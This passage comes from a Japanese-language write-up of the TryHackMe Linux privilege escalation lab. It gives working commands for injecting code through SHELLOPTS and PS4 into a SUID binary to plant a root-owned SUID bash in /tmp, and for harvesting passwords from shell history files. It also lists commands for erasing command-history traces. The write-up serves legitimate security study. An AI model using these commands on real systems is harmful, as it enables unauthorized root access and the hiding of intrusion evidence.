env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2

# → 大量のデバッグ出力が流れる（PS4 が繰り返し評価・実行される）
# → /tmp/rootbash が root 権限で生成される

# SUID バックドアでrootシェルを取得
/tmp/rootbash -p
# rootbash-4.1# → root権限取得（euid=0）
```

### 攻撃の仕組み

```
SHELLOPTS=xtrace  → Bash デバッグモードを強制有効化
PS4='$(command)'  → デバッグプロンプトの内容に「コマンド実行」を仕込む

SUID バイナリ（root権限）が起動
  → 内部で system() が /bin/sh を呼ぶ
  → デバッグモードが有効なのでスクリプト1行ごとに PS4 を評価
  → PS4 内のコマンドが root 権限で実行される
  → /tmp/rootbash（SUID付きbash）が生成される
```

### 今回の失敗：クリーンアップの順序ミス

```bash
# ❌ 誤った順序
rootbash-4.1# exit           # 先にrootシェルを抜ける
user@debian:~$ rm /tmp/rootbash  # → Operation not permitted（一般ユーザーでは消せない）

# ✅ 正しい順序
rootbash-4.1# rm /tmp/rootbash   # rootのうちに消す
rootbash-4.1# exit
```

root権限で作成したSUIDファイルは、一般ユーザー権限では削除できない。**「権限を持っているうちに、自分が作った特権ファイルを片付ける」**のが鉄則。

---

## Task 16: Passwords & Keys - History Files

### 概要

コマンドラインに直接パスワードを入力してしまった管理者の操作履歴（`.bash_history`）から認証情報を窃取し、root権限を奪取する。

### 手順

```bash
# 全ての隠しファイル（history系）の内容を確認
cat ~/.*history | less

# → mysql コマンドにパスワードがそのまま記録されているのを発見
#   mysql -h somehost.local -uroot -p[パスワード]

# 発見したパスワードで root に昇格
su root
# root@debian:/home/user# → root権限取得
```

### 脆弱性の根源

`-p` オプションの直後にパスワードを書くと（スペースなし）、ターミナルエミュレータのエコーが止まらずコマンドライン全体が `bash_history` に記録される。  
本来は `-p` だけ書いて Enter を押し、**パスワードプロンプトに入力する**ことで履歴への記録を防げる。

### 教訓：痕跡（アーティファクト）への意識

| 場所 | 残る情報 |
|-----|---------|
| `~/.bash_history` | 全ての実行コマンド |
| `~/.mysql_history` | MySQLセッションのクエリ履歴 |
| `~/.nano_history` | nanoで編集したファイル名 |

実戦での痕跡消去手法（参考）：

```bash
export HISTFILE=/dev/null   # セッション開始直後に履歴保存を無効化
history -c && history -w    # メモリとファイルの履歴を両方クリア
cat /dev/null > ~/.bash_history  # ファイルを空にする
```

---

## 次回の予定

Task 17: Passwords & Keys - Config Files から再開

---

## 関連リソース

- [TryHackMe: Linux PrivEsc](https://tryhackme.com/room/linprivesc)
- [GTFOBins](https://gtfobins.github.io/) — SUID/sudo悪用の参照
- [HackTricks: Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
